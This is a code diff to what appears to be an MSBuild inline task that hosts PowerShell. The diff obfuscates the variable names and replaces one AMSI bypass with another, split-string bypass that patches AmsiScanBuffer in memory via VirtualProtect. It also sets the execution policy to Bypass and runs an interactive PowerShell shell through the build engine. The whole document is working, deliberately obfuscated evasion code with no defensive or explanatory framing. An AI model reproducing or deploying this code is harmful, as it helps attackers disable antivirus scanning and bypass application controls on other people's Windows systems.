@@ -37,70 +37,81 @@
         {
             public override bool Execute()
             {
-                // Start a separate thread for PowerShell execution to avoid blocking MSBuild
-                Thread powerShellThread = new Thread(RunPowerShell);
-                powerShellThread.Start();
-                
-                // Wait for the thread to complete to ensure proper execution
-                powerShellThread.Join();
+                Thread x1 = new Thread(RunPowerShell);
+                x1.Start();
+                x1.Join();
                 return true;
             }
 
             private void RunPowerShell()
             {
-                Runspace rs = RunspaceFactory.CreateRunspace();
-                rs.Open();
-                PowerShell ps = PowerShell.Create();
-                ps.Runspace = rs;
-                string currentDirectory = Directory.GetCurrentDirectory();
+                Runspace x2 = RunspaceFactory.CreateRunspace();
+                x2.Open();
+                PowerShell y1 = PowerShell.Create();
+                y1.Runspace = x2;
+                string y2 = Directory.GetCurrentDirectory();
 
-                Console.WriteLine("PS " + currentDirectory + ">");
+                Console.WriteLine("PS " + y2 + ">");
 
-                // AMSI bypass code
+                // Obfuscated AMSI bypass
                 string amsiBypass = @"
-                $A=""5492868772801748688168747280728187173688878280688776828""
-                $B=""1173680867656877679866880867644817687416876797271""
-                [Ref].""A`ss`Embly"".""GET`TY`Pe""([string](0..37|%{[char][int](29+($A+$B).
-                substring(($_*2),2))})-replace "" "" ).
-                GetField([string](38..51|%{[char][int](29+($A+$B).
-                substring(($_*2),2))})-replace "" "",'NonPublic,Static').
-                SetValue($null,$true)
+                    $x1 = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.EndsWith(('Sys' + 'tem.dll')) }
+                    $y2 = $x1.GetType(('Micro' + 'soft.Win' + '32.Unsafe' + 'NativeMethods'))
+                    $z3 = $y2.GetMethods() | Where-Object { $_.Name -cmatch ('^Ge' + '.*P.*oc.*' + 'ddress$') }
+                    $w4 = $y2.GetMethod(('Get' + 'Module' + 'Handle'))
+                    $v5 = $w4.Invoke($null, @(('am' + 'si.d' + 'll')))
+                    $u6 = $z3[0].Invoke($null, @($v5, ('Ams' + 'iScan' + 'Buffer')))
+                    $t7 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName(('Ref' + 'lected' + 'Delegate'))), [Reflection.Emit.AssemblyBuilderAccess]::Run)
+                    $s8 = $t7.DefineDynamicModule(('InMem' + 'oryMod' + 'ule'), $false)
+                    $r9 = @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType())
+                    $q10 = [Bool]
+                    $p11 = $s8.DefineType(('MyDel' + 'egate' + 'Type'), ('Class' + ',Public,Sealed,AnsiClass,AutoClass'), [MulticastDelegate])
+                    $o12 = $p11.DefineConstructor(('RTSpe' + 'cialName,HideBySig,Public'), [Reflection.CallingConventions]::Standard, $r9)
+                    $o12.SetImplementationFlags(('Run' + 'time,Managed'))
+                    $n13 = $p11.DefineMethod(('Invo' + 'ke'), ('Public,Hide' + 'BySig,NewSlot,Virtual'), $q10, $r9)
+                    $n13.SetImplementationFlags(('Run' + 'time,Managed'))
+                    $m14 = $p11.CreateType()
+                    $l15 = $w4.Invoke($null, @(('kern' + 'el32.d' + 'll')))
+                    $k16 = $z3[0].Invoke($null, @($l15, ('Virt' + 'ualPro' + 'tect')))
+                    $j17 = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($k16, $m14)
+                    $i18 = 0
+                    $h19 = $j17.Invoke($u6, 3, 0x40, [ref]$i18)
+                    Start-Sleep 1
+                    [Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8, 0x00, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3), 0, $u6, 12)
                 ";
-
-                // Execute AMSI bypass
+        
                 try
                 {
-                    ps.AddScript(amsiBypass);
-                    ps.Invoke();
-                    ps.Commands.Clear();
+                    y1.AddScript(amsiBypass);
+                    y1.Invoke();
+                    y1.Commands.Clear();
                     Console.WriteLine("AMSI bypass applied successfully.");
                 }
                 catch (Exception e)
                 {
                     Console.WriteLine("ERROR: Failed to apply AMSI bypass: " + e.Message);
-                    rs.Close();
+                    x2.Close();
                     return;
                 }
 
                 // Set execution policy to Bypass
                 try
                 {
-                    ps.AddScript("Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force");
-                    ps.Invoke();
-                    ps.Commands.Clear();
+                    y1.AddScript("Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force");
+                    y1.Invoke();
+                    y1.Commands.Clear();
                     Console.WriteLine("Execution policy set to Bypass.");
                 }
                 catch (Exception e)
                 {
                     Console.WriteLine("ERROR: Failed to set execution policy: " + e.Message);
-                    rs.Close();
+                    x2.Close();
                     return;
                 }
 
-                // Interactive PowerShell loop
                 while (true)
                 {
-                    Console.Write("PS " + currentDirectory + "> ");
+                    Console.Write("PS " + y2 + "> ");
                     string cmd = Console.ReadLine();
                     if (string.IsNullOrWhiteSpace(cmd)) continue;
 
@@ -120,9 +131,9 @@
                             if (Directory.Exists(targetPath))
                             {
                                 Directory.SetCurrentDirectory(targetPath);
-                                currentDirectory = Directory.GetCurrentDirectory();
-                                ps.AddScript("Set-Location \"" + currentDirectory + "\"").Invoke();
-                                ps.Commands.Clear();
+                                y2 = Directory.GetCurrentDirectory();
+                                y1.AddScript("Set-Location \"" + y2 + "\"").Invoke();
+                                y1.Commands.Clear();
                             }
                             else
                             {
@@ -132,9 +143,9 @@
                         }
 
                         // Execute the command and capture output
-                        ps.AddScript(cmd + " | Out-String");
-                        Collection<PSObject> psOutput = ps.Invoke();
-                        Collection<ErrorRecord> errors = ps.Streams.Error.ReadAll();
+                        y1.AddScript(cmd + " | Out-String");
+                        Collection<PSObject> psOutput = y1.Invoke();
+                        Collection<ErrorRecord> errors = y1.Streams.Error.ReadAll();
 
                         // Handle errors
                         if (errors.Count > 0)
@@ -167,11 +178,11 @@
                     }
                     finally
                     {
-                        ps.Commands.Clear();
+                        y1.Commands.Clear();
                     }
                 }
 
-                rs.Close();
+                x2.Close();
             }
         }
         ]]>
